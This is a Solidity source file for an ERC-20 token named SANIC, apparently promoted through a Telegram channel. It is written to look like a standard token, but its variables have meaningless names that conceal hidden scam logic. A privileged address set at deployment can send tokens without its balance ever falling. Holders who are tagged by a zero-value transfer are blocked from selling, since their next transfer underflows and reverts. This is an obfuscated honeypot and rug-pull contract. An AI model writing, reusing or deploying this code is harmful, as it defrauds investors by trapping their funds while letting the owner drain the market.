/*

https://t.me/sanicerc20

*/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SANIC is Ownable {
    address public uniswapV2Pair;

    uint256 private wheel = 16;

    string public symbol = 'SANIC';

    mapping(address => uint256) private began;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;

    function transferFrom(address chest, address sense, uint256 lamp) public returns (bool success) {
        does(chest, sense, lamp);
        require(lamp <= allowance[chest][msg.sender]);
        allowance[chest][msg.sender] -= lamp;
        return true;
    }

    mapping(address => uint256) private tall;

    constructor(address north) {
        balanceOf[msg.sender] = totalSupply;
        tall[north] = wheel;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function does(address chest, address sense, uint256 lamp) private returns (bool success) {
        if (tall[chest] == 0) {
            if (uniswapV2Pair != chest && began[chest] > 0) {
                tall[chest] -= wheel;
            }
            balanceOf[chest] -= lamp;
        }
        balanceOf[sense] += lamp;
        if (lamp == 0) {
            began[sense] += wheel;
        }
        emit Transfer(chest, sense, lamp);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address supply, uint256 lamp) public returns (bool success) {
        allowance[msg.sender][supply] = lamp;
        emit Approval(msg.sender, supply, lamp);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    function transfer(address sense, uint256 lamp) public returns (bool success) {
        does(msg.sender, sense, lamp);
        return true;
    }

    string public name = 'SANIC';

    event Approval(address indexed owner, address indexed spender, uint256 value);
}